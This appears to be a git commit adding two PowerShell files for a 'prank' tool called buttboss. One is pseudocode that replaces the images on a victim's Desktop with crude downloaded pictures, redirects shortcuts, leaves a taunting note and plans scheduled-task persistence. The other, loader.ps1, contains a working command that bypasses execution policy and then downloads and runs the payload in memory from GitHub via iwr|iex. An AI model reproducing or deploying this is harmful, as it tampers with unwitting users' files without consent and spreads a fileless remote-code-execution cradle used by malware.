0dd3906618929247019d63a3a545cc5db6c8230d
mellonaut <rleeazw@outlook.com>
2022-04-23 09:02:29 -0400

    Pseudo-code
    Wrapper is done, skeletoncode for the rest give me something to work on latr

---
+++ buttboss.ps1
@@ -0,0 +1,31 @@
+# House keeping wrapper script that downloads current version of buttboss from github
+Get Credentials
+set -ep bypass 
+Download the script and create the Goofin directory
+Create goofin/butts goofin/cuts  
+
+
+# Script itself 
+# Enumerate targets
+Go to desktop and list all the files into an array called targets
+    for each target in targets 
+        Webrequest ImageSearch "juicy-ass-butt-%RANDOMNUMBER%"
+        Save to goofin/butts directory as butt1.png, butt2.png, butt3.png 
+        Cat butts dir and store in $butts 
+    for eah target in targets
+        Where extension = any image extension
+            Copy each item with original filename to Goofin/cuts        
+            Loop through and replace file with $butts content sequentially, starting over if more targets > butts
+        Where extension = .lnk 
+            Copy each item with original filename to Goofin/cuts
+            leave icon the same, just redirect link to open a google search for random butt search
+
+# Hit 'em with it
+cd Desktop  notepad buttboss.txt writefile "Now who's boss." 
+
+
+
+# Persistence mechanisms
+
+# Schduled task for the script
+# Could we set it to choose a number between 7-20 = x and create a that runs every x days?
---
+++ loader.ps1
@@ -0,0 +1,9 @@
+# House keeping script that downloads current version of buttboss from github and executes in memory instead
+Get-Credentials
+
+# Create goofin/butts goofin/cuts
+Mkdir C:\Goofin\butts -Force
+Mkdir C:\Goofin\cuts -Force
+
+# Grab payload from github and execute in memory
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://github.com/mellonaut/buttboss/buttboss.ps1')|iex"
